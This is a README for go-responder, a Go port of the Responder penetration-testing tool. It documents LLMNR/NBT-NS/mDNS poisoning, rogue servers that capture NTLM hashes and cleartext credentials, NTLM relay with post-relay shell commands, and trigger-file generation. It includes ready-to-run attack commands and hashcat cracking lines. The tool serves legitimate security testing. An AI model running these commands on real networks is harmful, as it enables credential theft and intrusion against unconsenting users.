# go-responder

A zero-dependency, single static binary port of [Responder](https://github.com/lgandx/Responder) written in Go.  
Captures NTLMv1/NTLMv2 hashes and cleartext credentials from LLMNR, NBT-NS, mDNS poisoning and rogue protocol servers.

```
  ██████╗  ██████╗       ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗
 ██╔════╝ ██╔═══██╗      ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
 ██║  ███╗██║   ██║█████╗██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
 ██║   ██║██║   ██║╚════╝██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
 ╚██████╔╝╚██████╔╝      ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═════╝  ╚═════╝       ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
```

## Features

### Poisoners
| Protocol | Port | Description |
|----------|------|-------------|
| LLMNR | UDP 5355 | Link-Local Multicast Name Resolution |
| NBT-NS | UDP 137 | NetBIOS Name Service |
| mDNS | UDP 5353 | Multicast DNS |
| DNS | TCP/UDP 53 | Rogue DNS server |

### Capture Servers
| Protocol | Port | Captures |
|----------|------|---------|
| SMB | 445 | NTLMv1/v2 (SMB1 + SMB2) |
| HTTP | 80 | NTLMv2, Basic auth cleartext |
| HTTPS | 443 | NTLMv2 (self-signed cert) |
| FTP | 21 | NTLMv2, cleartext |
| SMTP | 25 | NTLMv2, inline token |
| POP3 | 110 | NTLMv2, cleartext USER/PASS |
| IMAP | 143 | NTLMv2, cleartext LOGIN |
| LDAP | 389 | NTLMv2 SASL, cleartext simple bind |
| MSSQL | 1433 | NTLMv2 SSPI |
| DCE-RPC | random | NTLMv2 BIND/AUTH3 |
| WinRM | 5985 | NTLMv2 |
| HTTP Proxy | 3128 | NTLMv2, Basic auth cleartext |
| Kerberos | 88 | AS-REQ principal capture |

### Additional
- WPAD PAC file serving (auto-proxy poisoning)
- Trigger file generation - SCF, URL, LNK, desktop.ini (for writable share attacks)
- IP and hostname allow/deny filtering (`-RespondTo`, `-DontRespondTo`, `-RespondToName`, `-DontRespondToName`)
- NTLMv1 downgrade (`-lm`) for hashcat `-m 5500`
- Fixed or random NTLM challenge (`-c`)
- Analyze mode - log queries, never poison (`-A`)
- Selective poisoning — skip signing-required hosts (`--selective`)
- NTLM relay to fixed targets (`--relay`, `--relay-to`)
- **Persistent credential DB** — JSON file tracks captured accounts across runs; already-known accounts are flagged `✓ KNOWN` instead of re-captured
- **Rich capture output** — protocol-coloured cards show account, version, hashcat mode and hash at a glance

## Installation

### Pre-built binaries

```
release/go-responder-linux-amd64       # ELF static, no deps
release/go-responder-windows-amd64.exe # PE static, no deps
```

### Build from source

Requires Go 1.21+.

```
make linux    # build Linux ELF  → release/go-responder-linux-amd64
make windows  # build Windows PE → release/go-responder-windows-amd64.exe
make all      # both
```

## Usage

```
sudo ./go-responder-linux-amd64 -i eth0
```

### Flags

```
Core:
  -i <iface>        Network interface (required)
  -v                Verbose output
  -o <file>         Output file for captured hashes (default: hashes.txt)
  -db <file>        Persistent credential DB (default: hashes.db)
  -c <hex>          Fixed 8-byte NTLM challenge (random if not set)
  -A                Analyze mode - log queries but do not poison
  -lm               Force NTLMv1 downgrade (removes EXTENDED_SESSIONSECURITY)

Disable servers:
  -no-smb           Disable SMB server
  -no-http          Disable HTTP server
  -no-https         Disable HTTPS server
  -no-ftp           Disable FTP server
  -no-smtp          Disable SMTP server
  -no-pop3          Disable POP3 server
  -no-imap          Disable IMAP server
  -no-ldap          Disable LDAP server
  -no-dns           Disable DNS server
  -no-dcerpc        Disable DCE-RPC server
  -no-mssql         Disable MSSQL server
  -no-winrm         Disable WinRM server
  -no-kerberos      Disable Kerberos server
  -no-proxy         Disable HTTP proxy

Relay:
  -relay            Enable NTLM relay mode (forward auth to target instead of capturing)
  -relay-to <ip>    Comma-separated relay target IPs (auto-select if empty)
  -relay-cmd <cmd>  Shell command to execute after successful relay (experimental)
  -selective        Selective poisoning: only target hosts where SMB signing is not required

WPAD:
  -wpad             Enable WPAD PAC file serving
  -wpad-proxy <host:port>   Proxy to advertise in PAC file (default: self:3128)

Filtering:
  -RespondTo/-R <ip,...>          Only respond to these IPs
  -DontRespondTo/-r <ip,...>      Never respond to these IPs
  -RespondToName/-T <host,...>    Only respond to these hostnames
  -DontRespondToName/-N <host,...> Never respond to these hostnames

Trigger files:
  -lnkgen <dir>     Generate SCF/URL/LNK/desktop.ini trigger files and exit
```

### Examples

```
# Full capture on eth0
sudo ./go-responder-linux-amd64 -i eth0 -v

# Analyze mode - see who is querying without poisoning
sudo ./go-responder-linux-amd64 -i eth0 -A -v

# Force NTLMv1 (hashcat -m 5500)
sudo ./go-responder-linux-amd64 -i eth0 -lm

# Target a specific subnet, exclude a machine
sudo ./go-responder-linux-amd64 -i eth0 -R 10.10.10.0/24 -r 10.10.10.1

# Generate UNC trigger files for writable share attack
sudo ./go-responder-linux-amd64 -i eth0 -lnkgen /tmp/triggers

# SMB only (disable everything else)
sudo ./go-responder-linux-amd64 -i eth0 -no-http -no-https -no-ftp -no-smtp -no-pop3 -no-imap -no-ldap -no-dcerpc -no-mssql -no-winrm -no-kerberos -no-proxy

# NTLM relay to a fixed target (SMB signing disabled on 10.10.10.50)
sudo ./go-responder-linux-amd64 -i eth0 --relay --relay-to 10.10.10.50 --selective

# Resume a session — accounts already in hashes.db will show as KNOWN
sudo ./go-responder-linux-amd64 -i eth0 -db hashes.db -o hashes.txt
```

### Capture output

Each credential captured is rendered as a colour-coded card:

```
────  [SMB]  ★ NEW    NTLMv2  192.168.62.11:52341
   Account  NORTH\WINTERFELL$
   Hashcat  -m 5600 hashes.txt
   Hash     WINTERFELL$::NORTH:aabb...:ccdd...:eeff...
────────────────────────────────────────────────────────────────
```

If the same account (`domain\username`) was captured in a previous run the card shows `✓ KNOWN` and the hash is not written to the text file again.  The persistent DB (default `hashes.db`) survives between runs; delete it to start fresh.

### Hash output format

NTLMv2 (hashcat `-m 5600`):
```
USER::DOMAIN:CHALLENGE:NTProofStr:blob
```

NTLMv1 with `-lm` (hashcat `-m 5500`):
```
USER::DOMAIN:LMResponse:NTResponse:CHALLENGE
```

Kerberos PA-ENC-TIMESTAMP (hashcat `-m 19900`):
```
$krb5pa$23$USER$REALM$hex-encrypted-data
```

## Testing

```
bash test.sh
```

Runs 164 unit tests covering all handler functions with 69.5% statement coverage.  
The untested 30% is `serve*`/`poison*` infinite-loop listeners that require root and live network interfaces.

## Cracking captured hashes

```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt    # NTLMv2
hashcat -m 5500 hashes.txt /usr/share/wordlists/rockyou.txt    # NTLMv1
```

## Credits

Based on [Responder](https://github.com/lgandx/Responder) by Laurent Gaffie (lgandx).  
Go port - zero Python, zero dependencies, single static binary for air-gapped environments.
